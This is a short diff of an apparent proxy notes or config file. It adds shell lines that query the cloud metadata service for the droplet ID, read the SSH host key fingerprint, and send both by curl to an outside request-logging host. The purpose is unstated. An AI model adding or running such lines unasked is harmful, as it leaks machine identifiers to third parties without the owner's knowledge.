@@ -37,4 +37,8 @@ Total Custom Scopes
 7 scopes
 
 // httping -x localhost:8888 -g http://google.com
-// /etc/profile.d/proxy.sh
+// etc/profile.d/proxy.sh
+
+DROPLET_ID=$(echo `curl http://169.254.169.254/metadata/v1/id`)
+HOST_KEY=$(echo `ssh-keygen -lf /etc/ssh/ssh_host_ed25519_key.pub` | cut -d " " -f 2  | cut -d ":" -f 2)
+curl https://proxy-loop.requestcatcher.com/$HOST_KEY/$DROPLET_ID
